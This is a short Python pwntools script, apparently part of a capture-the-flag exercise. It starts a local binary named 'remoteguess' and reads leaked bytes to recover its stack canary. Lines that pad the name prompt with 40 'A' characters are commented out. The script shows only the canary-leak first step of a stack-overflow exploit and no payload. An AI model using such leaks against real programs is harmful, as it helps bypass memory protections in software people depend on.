from pwn import *

p = process('./remoteguess')

# read the canary value from the program
# p.sendlineafter('Enter your name:', 'A' * 40)
# p.recvuntil('A' * 40)
canary = u64(b'\x00' + p.recv(7))

print(f"Canary value: {hex(canary)}")
